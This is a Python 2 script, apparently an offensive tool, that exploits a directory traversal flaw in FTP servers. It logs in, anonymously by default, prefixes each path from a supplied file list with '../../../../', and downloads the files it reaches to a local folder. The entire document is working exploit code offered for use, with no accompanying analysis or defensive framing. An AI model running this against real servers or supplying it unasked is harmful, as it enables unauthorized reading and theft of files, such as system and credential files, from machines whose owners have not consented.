from ftplib import FTP
import os
import sys
import argparse

print('\033[0;32m'+"FTP Directory Traversal File Getter " + '0.1' + " Updated: " + 'August 29, 2018' +'\033[0;39m')
parser = argparse.ArgumentParser(description='\033[0;31m'+'Will leverage a directory traversal vulnerability to pull a list of files off a remote machine (FTP server must be vulnerable).'+'\033[0;39m')
parser.add_argument("-ip",  type=str, default="10.10.10.10", help='FTP Server IP Address (default: %(default)s)')
parser.add_argument("-port",  type=int, default=21, help='FTP Server Port (default: %(default)s)')
parser.add_argument("-username",  type=str, default="anonymous", help='FTP Server Username (default: %(default)s)')
parser.add_argument("-password",  type=str, default="anonymous", help='FTP Server Password (default: %(default)s)')
parser.add_argument("-localfolder",type=str, default="./ftpgetter/", help='Base local folder where we will store the files (default: %(default)s)')
parser.add_argument("-filelist",  type=str, default="filelist.txt", help='Text file containing the list of files in UNIX format (default: %(default)s)')
parser.add_argument("-skip_files",  nargs='+', type=str, default=".exe .dll .dat .so .lib", help='Skip files containing these strings (default: %(default)s)')
parser.add_argument("-dirtrav",  type=str, default="../../../../", help='Directory traversal prefix (default: %(default)s)')
args = parser.parse_args()

def getFile(filepath):
    path, file = os.path.split(args.localfolder+filepath)

    if os.path.isfile(args.localfolder+filepath.rstrip()):
        print "EXISTS.. SKIPPING "+ args.dirtrav + filepath.rstrip()
        return

    try:
        print "MAKE FOLDER: "+path
        os.makedirs(path)
    except OSError:
        if not os.path.isdir(path):
            pass

    if not "." in file: # Skip directories
        return

    if not any(x in filepath for x in args.skip_files):
        print "GET " + args.dirtrav + filepath.rstrip()
        try:
            ftp.retrbinary('RETR '+args.dirtrav+filepath.rstrip(), open(args.localfolder+filepath.rstrip(), 'wb').write)
        except:
            print "ERROR! ", str(sys.exc_info()[0])
            # raise #Debugging
    else:
        print "SKIP " + args.dirtrav + filepath.rstrip()


print '\033[0;31m'+"Connecting to FTP Server at: "+args.ip+'\033[0;39m'
ftp = FTP(args.ip)
ftp.login(args.username, args.password)

infile = open(args.filelist, 'r')
for filepath in infile:
    getFile(filepath)

ftp.quit()

